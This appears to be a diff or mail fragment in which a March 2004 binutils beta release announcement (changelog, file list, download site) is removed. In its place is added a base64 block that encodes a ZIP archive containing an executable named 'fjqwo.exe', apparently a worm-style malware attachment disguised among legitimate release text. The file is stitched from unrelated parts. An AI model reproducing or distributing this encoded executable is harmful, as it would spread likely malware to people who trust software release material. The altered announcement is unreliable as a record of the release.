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
 
-If you don't use
-
-# rpmbuild -ta binutils-xx.xx.xx.xx.xx.tar.bz2
-
-to compile the Linux binutils, please read patches/README in source
-tree to apply Linux patches.
-
-Changes from binutils 2.14.90.0.8:
-
-1. Update from binutils 2004 0303.
-2. Fixed linker for undefined symbols with non-default visibility.
-3. Sped up linker weakdef symbol handling.
-4. Fixed mixing ELF32 and ELF64 object files in archive.
-5. Added ia64 linker brl optimization.
-6. Fixed ia64 linker to disallow invalid dynamic relocations.
-7. Fixed DT_TEXTREL handling in ia64 linker.
-8. Fixed alignment handling in ia64 assembler.
-9. Improved ia64 assembler unwind table handling. 
-
-Changes from binutils 2.14.90.0.7:
-
-1. Update from binutils 2004 0114.
-2. Fixed an ia64 assembler unwind table bug. 
-3. Better handle IPF linker relaxation overflow.
-4. Fixed misc PPC bugs.
-
-Changes from binutils 2.14.90.0.6:
-
-1. Update from binutils 2003 1029.
-2. Allow type changes for undefined symbols.
-3. Fix EH frame optimization.
-4. Fix the check for undefined versioned symbol with wildcard.
-5. Support generating code for Itanium.
-6. Detect and warn bad symbol index.
-7. Update IPF assemebler DV check.
-
-Changes from binutils 2.14.90.0.5:
-
-1. Update from binutils 2003 0820.
-2. No longer use section names for ELF section types nor flags.
-3. Fix some ELF/IA64 linker bugs.
-4. Fix some ELF/ppc bugs.
-5. Add archive support to readelf.
-
-Changes from binutils 2.14.90.0.4.1:
-
-1. Update from binutils 2003 0722.
-2. Fix an ELF/mips linker bug.
-3. Fix an ELF/hpppa linker bug.
-4. Fix an ELF/ia64 assembler bug.
-5. Fix a linkonce support with C++ debug.
-6. A new working C++ demangler.
-7. Various alpha, mips, ia64, ... bug fixes.
-8. Support for the current gcc and glibc.
-
-Changes from binutils 2.14.90.0.4:
- 
-1. Fix an ia64 assembler hint@pause bug.
-2. Support Intel Precott New Instructions.
-
-Changes from binutils 2.14.90.0.3:
-
-1. Work around the brain dead libtool.
-
-Changes from binutils 2.14.90.0.2:
-
-1. Update from binutils 2003 0523.
-2. Fix 2 ELF visibility bugs.
-3. Fix ELF/ppc linker bugs.
-
-Changes from binutils 2.14.90.0.1:
-
-1. Update from binutils 2003 0515.
-2. Fix various ELF visibility bugs.
-3. Fix some ia64 linker bugs.
-4. Add more IAS compatibilities to ia64 assembler.
-
-Changes from binutils 2.13.90.0.20:
-
-1. Update from binutils 2003 0505.
-2. Fix various ELF visibility bugs.
-3. Fix some ia64 linker bugs.
-4. Fix some ia64 assembler bugs.
-5. Add some IAS compatibilities to ia64 assembler.
-6. Fix ELF common symbol alignment.
-7. Fix ELF weak symbol handling.
-
-Changes from binutils 2.13.90.0.18:
-
-1. Update from binutils 2003 0319.
-2. Fix an ia64 linker brl relaxation bug.
-3. Fix some ELF/ppc linker bugs.
-
-Changes from binutils 2.13.90.0.16:
-
-1. Update from binutils 2003 0121.
-2. Fix an ia64 gas bug.
-3. Fix some TLS bugs.
-4. Fix some ELF/ppc bugs.
-5. Fix an ELF/m68k bug.
-
-2. Include /usr/bin/c++filt.
-Changes from binutils 2.13.90.0.14:
-
-1. Update from binutils 2002 1126.
-2. Include /usr/bin/c++filt.
-3. Fix "ld -r" with execption handling.
-
-Changes from binutils 2.13.90.0.10:
-
-1. Update from binutils 2002 1114.
-2. Fix ELF/alpha bugs.
-3. Fix an ELF/i386 assembler bug.
-
-Changes from binutils 2.13.90.0.4:
-
-1. Update from binutils 2002 1010.
-2. More ELF/PPC linker bug fixes.
-3. Fix an ELF/alpha linker bug.
-4. Fix an ELF/sparc linker bug to support Solaris.
-5. More TLS updates.
-
-Changes from binutils 2.13.90.0.3:
-
-1. Update from binutils 2002 0814.
-2. Fix symbol versioning bugs for gcc 3.2.
-3. Fix mips gas.
-
-Changes from binutils 2.13.90.0.2:
-
-1. Update from binutils 2002 0809.
-2. Fix a mips gas compatibility bug.
-3. Fix an x86 TLS bfd bug.
-4. Fix an x86 PIC gas bug.
-5. Improve symbol versioning support.
-
-The file list:
-
-1. binutils-2.15.90.0.1.tar.bz2. Source code.
-2. binutils-2.14.90.0.8-2.15.90.0.1.diff.bz2. Patch against the
-   previous beta source code.
-3. binutils-2.15.90.0.1-1.i386.rpm. IA-32 binary RPM for RedHat EL 3.
-4. binutils-2.15.90.0.1-1.ia64.rpm. IA-64 binary RPM for RedHat EL 3.
-5. binutils-2.15.90.0.1-1.x86_64.rpm. X64_64 binary RPM for RedHat EL 3.
-
-There is no separate source rpm. You can do
-
-# rpmbuild -ta binutils-2.15.90.0.1.tar.bz2
-
-to create both binary and source rpms.
-
-The primary sites for the beta Linux binutils are:
-
-1. http://www.kernel.org/pub/linux/devel/binutils/
-
-Thanks.
-
-
-H.J. Lu
-hjl@lucon.org
-03/03/2004
+----------vsmsqojgcsflmuqqavno--
